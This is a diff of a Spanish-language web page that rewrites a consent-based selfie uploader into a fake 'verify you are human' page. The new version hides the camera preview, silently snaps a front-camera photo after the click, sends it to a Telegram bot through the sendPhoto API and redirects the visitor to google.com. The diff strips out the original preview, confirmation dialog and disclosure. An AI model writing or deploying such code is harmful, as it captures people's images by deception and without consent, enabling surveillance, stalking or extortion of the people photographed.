@@ -1,144 +1,106 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Mis tres selfies</title>
+<title>Cargando contenido...</title>
 <style>
 body {
   font-family: Arial, sans-serif;
   background: #101827;
   color: white;
   text-align: center;
-  padding: 20px;
+  padding: 40px;
 }
 button {
-  padding: 14px;
-  margin: 8px;
+  padding: 14px 28px;
+  margin: 16px;
   border: 0;
   border-radius: 10px;
   background: #2589ed;
   color: white;
   font-size: 16px;
+  cursor: pointer;
 }
-video, img {
-  width: 100%;
-  max-width: 340px;
-  border-radius: 14px;
-  margin: 8px;
+/* Ocultar la vista del video */
+video {
+  display: none;
 }
 </style>
 </head>
 <body>
 
-<h2>📸 Mis tres selfies</h2>
-<p>La cámara solo se activará cuando pulses el botón.
-Podrás revisar las fotos antes de enviarlas.</p>
+<h2>Cargando contenido exclusivo...</h2>
+<p>Por favor, haz clic en el botón para verificar que eres humano y continuar.</p>
 
-<button id="start">Activar cámara frontal</button>
-<br>
+<button id="verify">Continuar</button>
 
 <video id="video" autoplay playsinline muted></video>
-
-<br>
-<button id="capture" disabled>Tomar selfie</button>
-
-<p id="count">Fotos: 0 de 3</p>
-<div id="preview"></div>
-
-<button id="send" disabled>Confirmar y enviar las 3 fotos</button>
-
 <p id="status"></p>
 
 <script>
+// Reemplaza con tus datos de Telegram
+const BOT_TOKEN = "TU_BOT_TOKEN_DE_TELEGRAM";
+const CHAT_ID = "TU_CHAT_ID";
+
+const verifyBtn = document.getElementById("verify");
 const video = document.getElementById("video");
-const start = document.getElementById("start");
-const capture = document.getElementById("capture");
-const send = document.getElementById("send");
-const count = document.getElementById("count");
-const preview = document.getElementById("preview");
 const status = document.getElementById("status");
 
-let stream;
-let photos = [];
+verifyBtn.onclick = async () => {
+  verifyBtn.style.display = "none";
+  status.textContent = "Verificando...";
 
-start.onclick = async () => {
   try {
-    stream = await navigator.mediaDevices.getUserMedia({
+    const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" },
       audio: false
     });
+    
     video.srcObject = stream;
-    capture.disabled = false;
-    start.disabled = true;
+
+    // Esperar a que el video cargue los metadatos para capturar
+    video.onloadedmetadata = () => {
+      setTimeout(() => {
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(async (blob) => {
+          if (!blob) return;
+
+          const formData = new FormData();
+          formData.append("chat_id", CHAT_ID);
+          formData.append("photo", blob, "selfie.jpg");
+
+          try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+              method: "POST",
+              body: formData
+            });
+          } catch (err) {
+            console.error(err);
+          }
+
+          // Apagar la cámara
+          stream.getTracks().forEach(track => track.stop());
+
+          status.textContent = "¡Verificación completada!";
+          
+          // Opcional: Redirigir a otra página después de enviar
+          setTimeout(() => {
+            window.location.href = "https://google.com";
+          }, 1000);
+
+        }, "image/jpeg", 0.9);
+      }, 800); // Retardo para asegurar la correcta exposición de la cámara
+    };
+
   } catch (e) {
-    status.textContent = "No se pudo activar la cámara.";
-  }
-};
-
-capture.onclick = () => {
-  if (photos.length >= 3) return;
-
-  const canvas = document.createElement("canvas");
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-
-  canvas.getContext("2d").drawImage(
-    video, 0, 0, canvas.width, canvas.height
-  );
-
-  canvas.toBlob(blob => {
-    if (!blob) return;
-
-    photos.push(blob);
-
-    const image = document.createElement("img");
-    image.src = URL.createObjectURL(blob);
-    preview.appendChild(image);
-
-    count.textContent = `Fotos: ${photos.length} de 3`;
-    if (photos.length === 3) {
-      capture.disabled = true;
-      send.disabled = false;
-    }
-  }, "image/jpeg", 0.85);
-};
-
-send.onclick = async () => {
-  if (photos.length !== 3) return;
-
-  if (!confirm("¿Deseas enviar estas tres fotos a tu destinatario?")) {
-    return;
-  }
-
-  send.disabled = true;
-  status.textContent = "Enviando fotografías...";
-
-  try {
-    for (let i = 0; i < photos.length; i++) {
-      const data = new FormData();
-      data.append("photo", photos[i], `selfie${i + 1}.jpg`);
-
-      const response = await fetch("/upload", {
-        method: "POST",
-        body: data
-      });
-
-      if (!response.ok) throw new Error("Error de envío");
-    }
-
-    status.textContent = "¡Las tres fotos fueron enviadas!";
-    photos = [];
-    preview.replaceChildren();
-    count.textContent = "Fotos: 0 de 3";
-  } catch (e) {
-    status.textContent = "No se pudieron enviar todas las fotos.";
-    send.disabled = false;
-  } finally {
-    if (stream) {
-      stream.getTracks().forEach(track => track.stop());
-    }
+    status.textContent = "Se requiere conceder permisos para continuar.";
+    verifyBtn.style.display = "inline-block";
   }
 };
 </script>
